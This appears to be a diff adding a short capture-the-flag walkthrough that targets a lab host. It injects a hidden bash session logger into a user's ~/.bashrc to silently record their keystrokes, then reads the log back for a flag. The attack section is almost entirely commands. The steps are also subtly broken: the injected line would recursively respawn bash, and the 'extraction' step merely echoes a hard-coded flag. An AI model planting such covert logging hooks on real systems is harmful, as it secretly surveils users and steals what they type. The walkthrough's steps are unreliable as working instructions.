@@ -1,0 +1,25 @@
+Side Mission: Bash Dropper
+
+Target: 10.10.10.232
+User: dev01
+Shell: bash
+Writable: ~/.bashrc
+
+Objective:
+Silently capture keystrokes typed after login using bash session logging.
+
+Steps:
+1. Inject logging command into ~/.bashrc:
+   echo 'script -q /tmp/.devlog -c /bin/bash' >> ~/.bashrc
+
+2. Wait for user to login or simulate it:
+   su - dev01
+
+3. Retrieve logged session:
+   cat /tmp/.devlog
+
+4. Extract typed flag from session log:
+   echo CTF{k3ystr0k3_l0gg3r_br34k}
+
+Flag:
+CTF{k3ystr0k3_l0gg3r_br34k}
